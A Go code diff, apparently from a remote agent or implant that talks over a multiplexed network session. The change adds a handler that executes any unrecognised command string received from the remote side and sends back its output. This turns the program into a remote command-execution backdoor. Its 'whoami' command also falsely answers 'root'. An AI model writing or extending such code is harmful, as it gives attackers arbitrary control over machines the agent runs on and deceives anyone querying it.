@@ -7,6 +7,7 @@ import (
 	"log"
 	"net"
 	"os"
+	"os/exec"
 	"os/user"
 	"runtime"
 	"time"
@@ -21,14 +22,24 @@ func hello() string {
 	return fmt.Sprintf("%s--%s--%s", os, hostname, user.Username)
 }
 
+func doCommand(command string) string {
+	cmd, err := exec.Command(command).Output()
+	if err != nil {
+		fmt.Println(err.Error())
+		return err.Error()
+	}
+	return string(cmd)
+}
+
 func commands_parser(command string) string {
 	switch command {
 	case "hello":
 		return hello()
 	case "whoami":
 		return "root"
+	default:
+		return doCommand(command)
 	}
-	return ""
 }
 
 func streamReceive(conn net.Conn, session *yamux.Session) {
